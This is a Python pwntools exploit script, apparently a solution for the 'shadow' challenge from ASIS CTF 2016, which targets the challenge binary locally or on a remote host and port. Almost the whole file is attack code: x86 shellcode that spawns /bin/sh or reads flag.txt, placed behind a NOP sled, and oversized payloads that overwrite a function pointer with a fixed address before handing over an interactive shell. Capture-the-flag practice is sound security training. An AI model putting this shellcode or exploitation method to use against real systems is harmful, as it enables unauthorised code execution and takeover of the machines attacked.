#!/usr/bin/env python

from pwn import *
import sys

'''
struct beer_node {
	int desc_len;
	beer func ptr;
	char desc[???];
}
'''

def add_one(desc_len, desc):
	r.sendline('1')
	r.recvuntil('description length?')
	r.sendline(str(desc_len))			# max 0x100 000
	r.send(desc)
	r.recvuntil("beer uploaded to the memory!\n")
	r.recvuntil("\n")

def modify():
	r.send('AAAAAAAAAAAAAAAA' * 60172)		# 	r.send('x\n' * 50172)
	r.send('y\n')
	payload = p32(0x804A521) * 32766
	r.send(payload)

def beerdesc(desc):
	r.sendline('2')
	r.sendline(desc)
	r.recvuntil("tasty beer here! description:")
	r.clean()
	modify()


def exploit(r):
	r.recvuntil("Hey, what's your name?")

	shellcode = (
	    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
	    "\xc9\x89\xca\x6a\x08\x58@@@\xcd\x80"
	)

	shellcode2 = (
 		    "j\x00jhh///sh/binj\x08X@@@\x89\xe31\xc9\x99\xcd\x80"
	)

	shellcode3 = ("1\xc9\xf7\xe1\xb0\x05Qh.txthflag\x89\xe3\xcd\x80\x93\x91\xb0\x031\xd2f\xba\xff\x0fB\xcd\x80\x921\xc0\xb0\x04\xb3\x01\xcd\x80\x93\xcd\x80")

	r.sendline(shellcode.rjust(64, "\x90"))

	add_one(131080-9, "AAAAA".ljust(131080-9, "A"))

	payload = p32(0)		# beer index
	payload += "A" * 250
	beerdesc(payload)

	r.interactive()


if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/vagrant/asis-2016/shadow/shadow'])
        print util.proc.pidof(r)
        pause()
        exploit(r)